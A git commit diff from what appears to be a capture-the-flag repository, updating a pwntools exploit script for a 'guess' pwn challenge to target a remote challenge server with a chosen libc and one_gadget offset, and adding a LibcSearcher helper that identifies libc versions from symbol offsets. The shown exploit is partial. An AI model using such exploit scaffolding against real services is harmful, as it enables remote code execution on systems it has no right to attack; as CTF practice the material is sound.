d521a3aa3d14e1a6a2caaa14aa8da54e1f704638
CookedMelon <cc2414635846@163.com>
2022-12-16 10:30:56 +0800

    guess

--- adworld/pwn-guess/exp.py
+++ adworld/pwn-guess/exp.py
@@ -1,11 +1,12 @@
 from pwn import *
 import time
 from LibcSearcher import *
-p=process("./guess-bak")
-# p=remote("61.147.171.105",49856)
+# p=process("./guess")
+p=remote("61.147.171.105",62132)
 elf=ELF("./guess")
-libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
-# context.log_level=True
+libc=ELF('./libc-2.27.so')
+# libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
+context.log_level=True
 ru = lambda x : p.recvuntil(x)
 sn = lambda x : p.send(x)
 rl = lambda   : p.recvline()
@@ -14,7 +15,7 @@ rv = lambda x : p.recv(x)
 sa = lambda a,b : p.sendafter(a,b)
 sla = lambda a,b : p.sendlineafter(a,b)
 
-onegadget=0x4f2c5#bak时使用
+onegadget=0x4f3c2#bak时使用
 # onegadget=0xf3fa7
 def login(account,password):
     sla(b'Choice: ',b'1')
---
+++ adworld/pwn-guess/findlibc.py
@@ -0,0 +1,28 @@
+#!/usr/bin/python3
+from pwn import *
+from LibcSearcher import *
+import sys
+import os
+pwd=os.getcwd()
+len=len(sys.argv)
+# print('len:',len)
+libcname=sys.argv[1]
+if libcname[0]=='.' and libcname[1]=='/':
+    libcname=libcname[2:]
+if '/' in libcname:
+    libc=ELF(libcname)
+else:
+    print(pwd+'/'+libcname)
+    libc=ELF(pwd+'/'+libcname)
+if len>2:
+    pool=sys.argv[2:]
+else:
+    pool=['read','write']
+print(pool)
+print(pool[0],hex(libc.sym[pool[0]]))
+libc2=LibcSearcher(pool[0],libc.sym[pool[0]])
+for i in range(1,len-2):
+    print(pool[i],hex(libc.sym[pool[i]]))
+    libc2.add_condition(pool[i],libc.sym[pool[i]])
+libc2.dump('system')
+print("find",libc2.libc_list[0])
